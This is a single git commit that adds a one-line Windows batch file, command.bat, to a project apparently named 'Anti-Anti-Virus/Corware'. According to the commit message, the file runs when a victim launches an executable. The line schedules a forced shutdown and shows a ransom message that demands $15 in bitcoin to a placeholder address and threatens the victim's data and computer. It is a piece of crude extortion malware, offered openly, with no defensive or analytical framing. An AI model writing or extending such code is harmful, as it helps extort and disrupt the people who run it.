141aae33eb89e00f22ed4a3b4cd39d50c6a17706
Derek Owumi <derekowumi@gmail.com>
2020-03-17 09:02:00 +0300

    Create command.bat
    When a person runs the .exe file this will pop up and a bunch of things in the background

---
+++ Anti-Anti-Virus/Corware/command.bat
@@ -0,0 +1,1 @@
+shutdown -s  -t 2000 -c "Please give $15 in bitcoin to {bitcoin adresss} you have 30 minutes to deliver the Money If not all your data will be compromised aswell as your computer..."
